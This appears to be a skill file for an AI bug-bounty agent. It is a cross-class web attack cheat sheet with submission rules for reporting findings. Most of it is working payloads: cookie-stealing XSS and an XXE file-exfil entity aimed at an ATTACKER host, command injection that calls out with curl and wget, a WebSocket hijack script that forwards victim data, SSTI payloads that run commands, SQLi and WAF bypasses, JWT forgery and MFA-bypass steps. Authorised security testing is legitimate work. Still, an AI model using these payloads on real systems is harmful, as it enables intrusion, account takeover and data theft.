---
name: Security Arsenal
description: Cross-class payload, WAF-bypass, and submission-rule reference (XSS/SSRF/SQLi/XXE/NoSQLi/cmdi/SSTI/IDOR/traversal/smuggling/WebSocket/MFA/SAML) with chain-required and never-submit tables.
tags: [payloads, waf-bypass, methodology, exploitation, wordlists]
recommended_tools: [http_request, http_repeater, http_intruder, sqlmap, ffuf_scan, dalfox_xss_scan, jwt_analyzer, curl, python3, jq]
vuln_classes: []
domain: general
phase: enumeration
provenance: {source: uphiago/recon-skills, paths: [redteam/security-arsenal/SKILL.md]}
---

# Security Arsenal

Cross-class payload library, WAF/parser bypass tables, wordlists, and submission rules. Reach for this
when a hunter has identified a sink and needs the exact payload syntax, a bypass, or a ruling on whether a
finding is reportable. The hunt-* skills identify the sink; this skill provides the syntax and the
when-it-works context.

Every blind primitive (blind SQLi/XSS/SSRF/RCE/XXE) requires out-of-band confirmation before it counts —
hit an interactsh/Collaborator domain and confirm the callback. An error string in a 500 page can be a
parser log from an unrelated request; the OOB callback is the only deterministic proof.

Marker discipline: never confirm reflection with a generic keyword (a page containing "javascript" may just
be a JavaScript tutorial). Inject a unique random token and grep for that token:

```bash
m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
curl "https://target/search?q=${m}" | grep -c "$m"
```

Unescaped in HTML context = XSS potential; in a Location header = redirect; in a SQL error = injection.

---

## XSS

### Probes
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Proof of impact (cookie exfil)
```html
<img src=x onerror="fetch('https://ATTACKER?c='+btoa(document.cookie))">
<script>fetch('https://ATTACKER?c='+btoa(document.cookie))</script>
```

### CSP / filter bypasses
```html
<!-- unsafe-inline blocked -> use fetch/XHR exfil (above) -->
<!-- nonce present -> reuse a nonce reflected elsewhere on the page -->
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

<!-- Angular template injection (bypasses many CSPs) -->
{{constructor.constructor('alert(1)')()}}

<!-- mXSS (mutation-based) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Polyglot (HTML/JS/CSS contexts) -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@x<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS — sources -> sinks
Sources: `location.hash`, `location.search`, `location.href`, `document.referrer`, `window.name`, `document.URL`.
Sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(str,...)`, `setInterval(str,...)`,
`new Function()`, `element.src = javascript:...`, `location.href = ...`.

Automate parameter probing with `dalfox_xss_scan`; use `http_repeater` for context-specific manual tuning.

---

## SSRF

### Cloud metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
# GCP  (Header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure IMDS  (Header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Internal service fingerprinting
```bash
http://localhost:6379          # Redis (unauth RESP)
http://localhost:9200/_cat/indices   # Elasticsearch
http://localhost:2375/containers/json # Docker API
http://localhost:8080          # admin panel
https://10.96.0.1:443          # Kubernetes API server
```

### IP-filter bypasses (all -> 127.0.0.1)
```bash
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1    # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
# DNS rebinding: A record external during allowlist check, then flips to internal.
# Redirect chain: http://allowed.com/redirect?to=http://169.254.169.254/  (filter checks initial URL, follows redirects)
```

---

## SQL Injection

### Detection
```sql
'  ''  `  ')  '))
' OR '1'='1
' OR 1=1--     ' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL
```

### Column count (union)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind time-based by DBMS
```sql
' AND SLEEP(5)--                              -- MySQL
' AND pg_sleep(5)--                           -- PostgreSQL
'; WAITFOR DELAY '0:0:5'--                     -- MSSQL
' AND 1=dbms_pipe.receive_message('a',5)--     -- Oracle
```

### WAF bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                 -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                        -- Unicode apostrophe
```

Confirm/exploit with `sqlmap`; require statistical sampling for timing oracles (see Timing gate below).

---

## XXE

### Classic file read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB + exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

Upload vectors: SVG `<image href="file:///etc/passwd"/>`; DOCX with external entity in `word/document.xml`.
Parser reality: many modern parsers drop SYSTEM entities by default — still valid against Java SAX,
PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with a live XmlResolver, older lxml (<5.0),
Ruby Nokogiri with DTDLOAD, and embedded XML in SOAP/SAML/Office libraries.

---

## Path Traversal
```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    # double URL encoding
/etc/passwd%00.jpg                      # null-byte truncation (legacy)
....\/....\/etc/passwd                  # mixed separators
```

---

## IDOR / Privilege Escalation

### Horizontal
```text
GET /api/user/123/profile  ->  /api/user/124/profile     # numeric ID
GET /api/profile/<uuid-A>  ->  /api/profile/<uuid-B>      # victim UUID from elsewhere
PUT /api/user/123 (guarded) ->  DELETE /api/user/123 (not guarded)   # method swap
GET /v2/users/123 (guarded) ->  GET /v1/users/123 (not guarded)      # old API version
GET /api/orders  ->  /api/orders?user_id=456             # parameter add
```

### Vertical
```json
{"role":"admin"}   {"isAdmin":true}   {"admin":1}     // parameter pollution on update
```
```html
<input type="hidden" name="admin" value="true">        <!-- flip in repeater -->
```
```json
{"query":"{ __schema { types { name fields { name } } } }"}   // GraphQL introspection -> admin mutations
```

---

## Authentication Bypass

### JWT
```python
# alg:none — decode, set alg none, drop signature, keep trailing dot
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{h}.{p}."
```
```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt    # weak HMAC secret brute force
```
Use `jwt_analyzer` to enumerate alg-confusion (RS256->HS256), `kid` injection, and expiry issues.

### OAuth
```text
# Missing PKCE: /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z with no
#   code_challenge -> a 302 (not error) means PKCE not enforced.
# State parameter: missing/static state = CSRF on OAuth = account-linkage / ATO chain.
```

---

## NoSQL Injection (MongoDB)
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":"admin","password":{"$gt":""}}
{"$where":"this.username == 'admin'"}
```
```bash
# GET-form operator injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
# curl auth-bypass one-liner
curl -s -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```
Operators: `$ne` (!= null matches any), `$gt` ("" < any string), `$regex` (.* matches anything),
`$where` (JS eval — RCE on legacy MongoDB). No engine vuln_class — validate manually.

---

## Command Injection
```bash
; id     | id     ` id `     $(id)     && id     || id
; sleep 5     $(sleep 5)     `sleep 5`            # blind time-based
```
### Blind OOB
```bash
; curl https://ATTACKER
$(nslookup ATTACKER)
; wget https://ATTACKER/$(id|base64)
```
### Filter bypasses
```bash
# space filter
;{cat,/etc/passwd}     ;cat${IFS}/etc/passwd     ;IFS=,;cat,/etc/passwd
# keyword filter (cat/id blocked)
;c'a't /etc/passwd     ;c"a"t /etc/passwd     ;$(printf '\x63\x61\x74') /etc/passwd
# Windows
& dir     | type C:\Windows\win.ini     & ping -n 1 ATTACKER
```

---

## SSTI

### Universal probe (send all, see which evaluate)
```text
{{7*7}}    -> 49  Jinja2 (Python) or Twig (PHP)
${7*7}     -> 49  Freemarker (Java) or Spring EL
<%= 7*7 %> -> 49  ERB (Ruby) or EJS (Node)
#{7*7}     -> 49  Mako (Python) or Pebble (Java)
*{7*7}     -> 49  Spring Thymeleaf
{{7*'7'}}  -> 7777777  Jinja2 (Twig gives 49)
```

### RCE by engine
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```php
// Twig
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
```text
# Freemarker
${"freemarker.template.utility.Execute"?new()("id")}
```
```ruby
<%= `id` %>     <%= system("id") %>     <%= IO.popen('id').read %>   # ERB
```
```java
${T(java.lang.Runtime).getRuntime().exec('id')}                       # Spring Thymeleaf
```
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>     // EJS
```
Test in: name/bio/username fields, email/PDF/invoice templates, URL path params reflected in page,
error messages, search reflections, headers echoed into responses, notification templates.

---

## HTTP Request Smuggling

### CL.TE
```http
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
### TE.CL
```http
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

```
### TE.TE obfuscation (disable TE on one hop)
```http
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```
### H2.CL / H2.TE
In an HTTP/2-capable repeater, add a manual `Content-Length`/`Transfer-Encoding`; the front-end trusts the
HTTP/2 framing while the back-end trusts the injected header -> desync.

Fingerprint the front-end first (`curl -sI` -> `Server:`/`Via:`). Classic CL.TE/TE.CL are dead against
Nginx >=1.21, Caddy 2.x, and Envoy >=1.20, but still land on HAProxy <=2.4, older F5 BIG-IP, Citrix ADC,
some AWS ALB configs, and Apache Traffic Server. Impact chain: desync -> capture victim's next request ->
steal auth token; add cache poisoning for stored XSS at scale.

---

## WebSocket
```javascript
// IDOR / auth bypass over WS messages
{"action":"subscribe","channel":"user_VICTIM_ID"}
{"action":"getProfile","id":2}
{"action":"admin.getToken","userId":"1"}
```
```html
<!-- CSWSH: host on attacker origin; if Origin unchecked, victim cookies are sent -->
<script>
var ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = e => fetch('https://ATTACKER/?d='+encodeURIComponent(e.data));
</script>
```
```bash
# Origin validation test — any success = CSWSH
wscat -c wss://target/ws -H "Origin: https://evil.com"
wscat -c wss://target/ws -H "Origin: null"
wscat -c wss://target/ws -H "Origin: https://target.evil.com"
```
Injection through WS: XSS payloads in chat messages, `' OR 1=1--` in search actions, metadata URLs in
any server-side "preview/fetch" action (SSRF).

---

## MFA / 2FA Bypass

1. **OTP brute force (no rate limit)** — `http_intruder`/ffuf over `000000-999999`, filter 400/429; rotate
   session tokens or use GraphQL batching to defeat per-session limits.
2. **OTP reuse** — code not invalidated after use; replay across logout/login or across sessions.
3. **Response manipulation** — flip `{"success":false}` -> `{"success":true}`, or `401` -> `200`, in the
   verification response.
4. **Code predictability** — timestamp-derived OTPs; sweep +/- 30s of TOTP values.
5. **Backup codes not rate-limited** — 8-char alphanumeric space, often unthrottled.
6. **Skip MFA step** — after password, does the session cookie already reach `/dashboard` before
   `/mfa/verify`? Reuse a pre-MFA cookie in another browser.
7. **Race on verification** — fire two verifications concurrently; both succeeding = parallel-session ATO.

---

## SAML
```text
XSW  — inject an unsigned <Assertion id="evil"> alongside the signed one; validator checks the signed ID,
       app processes the evil ID.
Comment injection — <NameID>admin<!---->@company.com</NameID>: validator reads "user", app reads "admin".
Signature stripping — remove the <Signature> element, change NameID; passes if presence isn't enforced.
XXE in assertion — external entity inside <NameID> when the IdP response is parsed unsafely.
```
```bash
# Manual: decode, edit, re-encode
echo "BASE64_SAML" | base64 -d | xmllint --format - > saml.xml
cat saml.xml | base64 -w0
```
SAMLRaider (Burp extension) automates XSW.

---

## GF Pattern Names (tomnomnom/gf)
`gf xss ssrf idor sqli redirect lfi rce ssti debug_logic secrets upload-fields cors` — pipe a URL corpus
(`gau_discovery`/`waybackurls_discovery`/`katana_crawl` output) through these to route params into the
matching payload section above.

---

## Wordlists & Fuzz Targets
Installed in `~/wordlists/`: `common.txt`, `params.txt`, `api-endpoints.txt`, `dirs.txt`, `sensitive.txt`.
Feed to `ffuf_scan`/`feroxbuster_scan`/`gobuster_scan`.
```text
# sensitive files
/.env  /.git/config  /config.json  /credentials.json  /backup.sql  /dump.sql
/.DS_Store  /.well-known/security.txt
# admin
/admin  /admin/login  /administrator  /wp-admin  /manager  /console  /dashboard  /panel
# API discovery
/api  /api/v1  /api/v2  /graphql  /graphiql  /swagger  /swagger-ui.html  /api-docs  /openapi.json
```

---

## WAF Evaluation Order
Try bypasses in this order; most engagements succeed at step 2 (WAF and origin disagree on request parsing):
1. **Encoding** — case variation, single URL-encode, double URL-encode, Unicode escape, HTML entity, UTF-8 overlong.
2. **Parser quirks** — XML namespaces, JSON `\u` escapes mid-keyword, `application/json` vs
   `x-www-form-urlencoded` confusion, multipart boundary tricks.
3. **Protocol-level** — HTTP/2 vs 1.1 inspection gaps, `X-Original-URL`, `X-Forwarded-*` smuggling, Host injection.
4. **Vendor-specific** — Cloudflare / AWS WAF / Akamai / Imperva / F5 ASM signature gaps.

---

## Validation Gates

**OOB gate:** every blind primitive requires an out-of-band callback before filing. Ranking:
Burp Collaborator > interactsh-client > self-hosted catch-all DNS+HTTP. Never DNSLog.cn on paid work.

**Timing gate:** single-trial timing deltas are noise. Require n>=10 interleaved trials with Welch's t > 3.
```python
import statistics
def welch_t(a, b):
    ma, mb = statistics.mean(a), statistics.mean(b)
    va, vb = statistics.variance(a), statistics.variance(b)
    return (ma - mb) / ((va/len(a) + vb/len(b)) ** 0.5)
# interleave control vs test, n=10 each; t > 3 = real signal
```
The same sampling rule applies to boolean-blind oracles judged by response length or status under jitter.

---

## Never Submit (destroys validity ratio)
Missing security headers (CSP/HSTS/X-Frame-Options); missing SPF/DKIM/DMARC; GraphQL introspection alone;
banner/version disclosure with no working CVE; clickjacking on non-sensitive pages; tabnabbing; CSV
injection with no execution; CORS `*` with no credentialed exfil PoC; logout CSRF; self-XSS; open redirect
alone; disclosed OAuth client_secret in a mobile app; SSRF with DNS-callback only; host-header injection
alone; rate limit on non-critical forms; session not invalidated on logout; concurrent sessions; internal
IP in an error message; mixed content; weak TLS ciphers; missing HttpOnly/Secure flags alone; broken links;
password-field autocomplete.

## Conditionally Valid — Requires a Proven Chain
Build and confirm the chain end-to-end *before* reporting. Never file A with "could chain to B".

| Standalone | Chain required | Result |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (funds/email change) | High |
| Rate-limit bypass | + OTP/token brute force succeeds | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host-header injection | + password-reset email consumes it | High |
| Prompt injection | + cross-user data read / exfil / RCE | High |
| S3 bucket listing | + JS bundles leak API keys / OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered on that subdomain | Critical |
| GraphQL introspection | + auth-bypass mutation or IDOR on node() | High |
